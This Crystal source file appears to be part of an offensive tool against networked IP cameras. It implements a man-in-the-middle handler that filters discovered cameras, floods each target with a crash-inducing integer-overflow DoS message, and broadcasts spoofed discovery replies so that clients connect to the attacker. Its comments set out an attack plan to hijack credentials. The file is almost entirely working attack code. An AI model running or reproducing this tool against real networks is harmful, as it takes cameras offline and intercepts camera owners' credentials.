module XET::App
  module Error
    abstract class MITM::Handler < XET::Error
      class AlreadyListening < MITM::Handler
      end
    end
  end
end

class XET::App::MITM::Handler
  # What needs to happen:
  # Client sends out broadcast Network::Common::Request
  # Cameras send out broadcast Network::Common::Reply
  # Run all replies through a filter(ip, mac, sn, etc)
  # Save all Network::Common::Reply that passes the filter to an array after altering each one with the proper data where needed
  # Send out DoS to each camera
  # Create a MITM server for each camera (see if we can modify the ports for tcp, udp, etc)
  # Spam modified Network::Common::Reply to client for all spoofed cameras
  # Hijack credentials

  # THINGS TO TEST
  # Right now this only could work for search devices BUT
  #   - If we can broadcast again to try and reposition the client
  #   - If we can insert ourselves somewhere in the connection.
  #  AFTER Camera DoS then this can be more powerful >:D

  # ATTACK PLAN V2
  # Actively ping all cameras on the network every 10 seconds and on startup
  # If a camera passes the filter, modify the netcom and take it offline using DoS
  # Wait for a client ping
  # Send client all modifed netcoms

  module Filter
    alias FilterType = (String | Regex)

    class Camera
      property? target_all = false
      property names = [] of FilterType
      property serial_numbers = [] of FilterType
      property mac_addresses = [] of FilterType
      property ip_addresses = [] of FilterType

      def empty?
        names.empty? && serial_numbers.empty? && mac_addresses.empty? && ip_addresses.empty?
      end
    end

    class Client
      property? target_all = false
      property ip_addresses = [] of FilterType

      def empty?
        ip_addresses.empty?
      end
    end
  end

  @netcom_request_channel = Channel(::Socket::IPAddress).new
  @netcom_reply_channel = Channel(XET::Command::Network::Common::Reply).new

  property clients_filter : Filter::Client = Filter::Client.new
  property cameras_filter : Filter::Camera = Filter::Camera.new

  @discovery_socket : XET::Socket::UDP

  getter port : UInt16

  def initialize(@port = XET::DEFAULT_DISCOVERY_PORT)
    @discovery_socket = XET::Socket::UDP.new(XET::App.broadcast_ip, @port)
    refresh_socket
    stop
    Log.info { "MITM::Handler: Bound to #{XET::App.bind_ip} on #{@port}" }
  end

  private def make_netcom_reply_hash(netcom_reply : XET::Command::Network::Common::Reply) : UInt64
    netcom_reply.config.host_ip.as(::Socket::IPAddress).address.hash &+ netcom_reply.config.mac.as(String).hash
  end

  def refresh_socket
    @discovery_socket = XET::Socket::UDP.new(XET::App.broadcast_ip, @port)
    @discovery_socket.bind ::Socket::IPAddress.new(XET::App.bind_ip, @port.to_i32)
    @discovery_socket.broadcast = true

    @netcom_request_channel = Channel(::Socket::IPAddress).new
    @netcom_reply_channel = Channel(XET::Command::Network::Common::Reply).new
  end

  def start
    if @discovery_socket.closed?
      refresh_socket
      Log.info { "MITM::Handler: Starting listening on #{port}" }
      _spawn_discovery_fiber
      _spawn_main_fiber
    else
      raise XET::App::Error::MITM::Handler::AlreadyListening.new
    end
  end

  private def _spawn_discovery_fiber
    spawn(name: "XET::App::MITM::Handler -> Listen Fiber") do
      until @discovery_socket.closed?
        begin
          @discovery_socket.send XET::Command::Network::Common::Request.new
          ip_and_msg = @discovery_socket.receive_message
          incoming_ip, xmsg = ip_and_msg[1], ip_and_msg[0]
          if xmsg.id == XET::Command::Network::Common::Request::ID
            spawn { @netcom_request_channel.send incoming_ip } if netcom_request = XET::Command::Network::Common::Request.from_msg?(xmsg)
          elsif xmsg.id == XET::Command::Network::Common::Reply::ID
            spawn { @netcom_reply_channel.send netcom_reply } if netcom_reply = XET::Command::Network::Common::Reply.from_msg?(xmsg)
          end
        rescue e : XET::Error::Command::CannotParse
          # We can't parse the message.
        rescue e : XET::Error::Receive::Timeout
        rescue e : XET::Error::Receive
          unless e.is_a?(XET::Error::Receive::Timeout)
            Log.info { "#{Fiber.current.name}: Listener on #{@port} had an exception: #{e}" }
          end
        rescue e : XET::Error::Socket::Closed
          # Socket closed so do nothing to gracefull exit
        end
      end
    end
  end

  private def _spawn_main_fiber
    _spawn_clients_fiber
    _spawn_cameras_fiber
  end

  private def _spawn_clients_fiber
    spawn(name: "XET::App::MITM::Handler -> Client Fiber") do
      until @netcom_request_channel.closed?
        begin
          client_ip = @netcom_request_channel.receive

          if !clients_filter.empty? || clients_filter.target_all?
            passes_filter = clients_filter.target_all? || (clients_filter.ip_addresses.any? do |filter_type_item|
              if filter_type_item.class == String
                filter_type_item.as(String) == client_ip.address && client_ip.address != XET::App.server_ip
              else
                !!(client_ip.address =~ filter_type_item.as(Regex))
              end
            end)
            Log.info { "#{Fiber.current.name}: Potential client detected @ #{client_ip.address}" }
            if passes_filter
              Log.info { "#{Fiber.current.name}: Client detected that passes the filter @ #{client_ip.address}" }
              # TODO: DO SOMETHING THE THE CLIENT LATER!
            end
          end
        rescue Channel::ClosedError
          Log.info { "#{Fiber.current.name}: Channel closed" }
          stop
        end
      end
    end
  end

  private def _spawn_cameras_fiber
    spawn(name: "XET::App::MITM::Handler -> Camera Fiber") do
      until @netcom_reply_channel.closed?
        found_cameras = {} of UInt64 => XET::Command::Network::Common::Reply
        begin
          netcom_reply = @netcom_reply_channel.receive

          if !cameras_filter.empty? || cameras_filter.target_all?
            matches_name = (cameras_filter.names.any? do |filter_type_item|
              if filter_type_item.class == String
                filter_type_item.as(String) == netcom_reply.config.hostname
              else
                !!(netcom_reply.config.hostname.to_s =~ filter_type_item.as(Regex))
              end
            end)

            matches_serial_number = (cameras_filter.serial_numbers.any? do |filter_type_item|
              if filter_type_item.class == String
                filter_type_item.as(String) == netcom_reply.config.serial_number
              else
                !!(netcom_reply.config.serial_number.to_s =~ filter_type_item.as(Regex))
              end
            end)

            matches_ip_address = (cameras_filter.ip_addresses.any? do |filter_type_item|
              if filter_type_item.class == String
                filter_type_item.as(String) == netcom_reply.config.host_ip.try(&.address)
              else
                !!(netcom_reply.config.host_ip.try(&.address).to_s =~ filter_type_item.as(Regex))
              end
            end)

            matches_mac_address = (cameras_filter.mac_addresses.any? do |filter_type_item|
              if filter_type_item.class == String
                filter_type_item.as(String) == netcom_reply.config.mac
              else
                !!(netcom_reply.config.mac.to_s =~ filter_type_item.as(Regex))
              end
            end)

            passes_filter = (cameras_filter.target_all? || matches_name || matches_serial_number || matches_ip_address || matches_mac_address)
            if netcom_reply.config.host_ip.try(&.address) != XET::App.server_ip
              Log.info { "#{Fiber.current.name}: Potential camera detected @ #{netcom_reply.config.host_ip}" }
              Log.info { "#{Fiber.current.name}: #{netcom_reply.message}" }
              if passes_filter && !found_cameras[make_netcom_reply_hash(netcom_reply)]? &&
                 Log.info { "#{Fiber.current.name}: Camera detected that passes the filter @ #{netcom_reply.config.host_ip}, working to intercept" }
                found_cameras[make_netcom_reply_hash(netcom_reply)] = netcom_reply
                _spawn_client_hijack_fiber(netcom_reply)
              end
            end
          end
        rescue Channel::ClosedError
          Log.info { "#{Fiber.current.name}: Channel closed" }
          stop
        end
      end
    end
  end

  private def _spawn_client_hijack_fiber(netcom_reply : XET::Command::Network::Common::Reply)
    stop_dos_channel = Channel(Bool).new
    stop_spoof_channel = Channel(Bool).new

    # Modify the network reply so we can start spoofing it
    spoofed_netcom_reply = XET::Command::Network::Common::Reply.new
    # Copy over the netcom reply's config object 
    spoofed_netcom_reply.config = netcom_reply.config.dup
    Log.info { "Spoofing camera #{netcom_reply.config.serial_number} with address #{XET::App.server_ip}" }
    # Set our ip and mac address to our information.
    # TODO: Check if this actually matters lol.
    spoofed_netcom_reply.config.host_ip = ::Socket::IPAddress.new(XET::App.server_ip, 0)
    spoofed_netcom_reply.config.mac = XET::App.mac_address

    spoofed_netcom_reply.build_message!

    spawn(name: "XET::App::MITM::Handler -> Camera DoS Fiber #{netcom_reply.config.host_ip.as(::Socket::IPAddress).address}") do
      Log.info { "#{Fiber.current.name}: Starting DOS" }

      dos_socket = XET::Socket::TCP.new(netcom_reply.config.host_ip.as(::Socket::IPAddress).address, netcom_reply.config.tcp_port.as(UInt16).to_i)
      until stop_spoof_channel.closed? || dos_socket.closed?
        select
        when stop_dos = stop_dos_channel.receive
          stop_dos_channel.close
          dos_socket.close
        when timeout 1.second
          dos_socket.send_message XET::Command::DoS::SizeIntOverflow.new
        end
      end
    rescue e : XET::Error::Socket::ConnectionRefused | XET::Error::Send::BrokenPipe
      Log.info { "#{Fiber.current.name}: #{e.inspect} Sleeping for 10 seconds" }
      # Do nothing because we want to continue the DoS campaign the moment the camera comes up incase the client doesn't reattempt a search within two minutes.
      sleep 10.seconds
    rescue e
      Log.info { "#{Fiber.current.name}: Socket error #{e.inspect}" }
      raise e
    end

    spawn(name: "XET::App::MITM::Handler -> Spoof Broadcast Fiber #{netcom_reply.config.serial_number}") do
      Log.info { "#{Fiber.current.name}: Starting Spoof Broadcast" }
      until stop_spoof_channel.closed? || @discovery_socket.closed?
        begin
          select
          when stop_spoof = stop_spoof_channel.receive
            stop_spoof_channel.close
          when timeout 200.milliseconds
            begin
              @discovery_socket.send_message spoofed_netcom_reply
            rescue e
              Log.error { "#{Fiber.current.name}: #{e.inspect}" }
              raise e
            end
          end
        rescue e : Channel::ClosedError
          # Do nothing, we will quit anyways
        rescue e
          Log.error { "#{Fiber.current.name}: #{e.inspect}" }
          raise e
        end
      end
    end
  end

  def stop
    if !@discovery_socket.closed?
      @discovery_socket.close
      Log.info { "#{Fiber.current.name}: Closing discovery_socket" }
    end

    if !@netcom_request_channel.closed?
      @netcom_request_channel.close
      Log.info { "#{Fiber.current.name}: Closing netcom_request_channel" }
    end

    if !@netcom_reply_channel.closed?
      @netcom_reply_channel.close
      Log.info { "#{Fiber.current.name}: Closing netcom_reply_channel" }
    end
  end

  def is_running?
    !@discovery_socket.closed? && !@netcom_request_channel.closed? && @netcom_reply_channel.closed?
  end
end
